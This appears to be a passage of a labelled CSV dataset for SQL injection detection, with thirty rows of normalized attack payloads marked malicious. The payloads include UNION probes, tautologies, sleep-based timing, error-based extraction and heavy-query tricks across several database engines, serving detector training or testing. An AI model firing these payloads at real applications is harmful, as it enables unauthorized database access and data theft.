row_index,payload_norm,label,sqli_type_hint
1350,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",1,
1351,select case when 1892 = 3646 then 1 else null end--,1,
1352,"-7416"" where 7656 = 7656 order by 1--",1,
1353,"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""tbbk"" like ""tbbk",1,
1354,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1,
1355,"-6747"" or 9323 = 9323#",1,
1356,-1219' ) or 5592 = 4835,1,
1357,"1"" ) ) ) union all select null,null,null,null,null#",1,
1358,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",1,
1359,"-8566"" ) as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#",1,
1360,"-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--",1,
1361,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1362,1 ) as mtda where 3951 = 3951,1,
1363,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'eugs' = 'eugs",1,
1364,1' ) where 7908 = 7908 or sleep ( 5 ) --,1,
1365,"-1438 where 6759 = 6759 union all select 6759,6759#",1,
1366,"iif ( 9190 = 5059,1,1/0 )",1,
1367,"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx",1,
1368,"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
1369,( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7812 = 7812 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) from dual ),1,
1370,1' ) and ( 1414 = 4775 ) *4775 and ( 'mlmw' = 'mlmw,1,
1371,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'wmoo' like 'wmoo",1,
1372,"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) ||'",1,
1373,"1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
1374,"1 ) where 9338 = 9338 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
1375,"1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
1376,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx,1,
1377,-1890' ) ) ) or 8526 = 1389 and ( ( ( 'ecgt' = 'ecgt,1,
1378,1 ) where 7026 = 7026,1,
1379,"-6388'+ ( select 'jqld' where 8600 = 8600 union all select 8600,8600#",1,
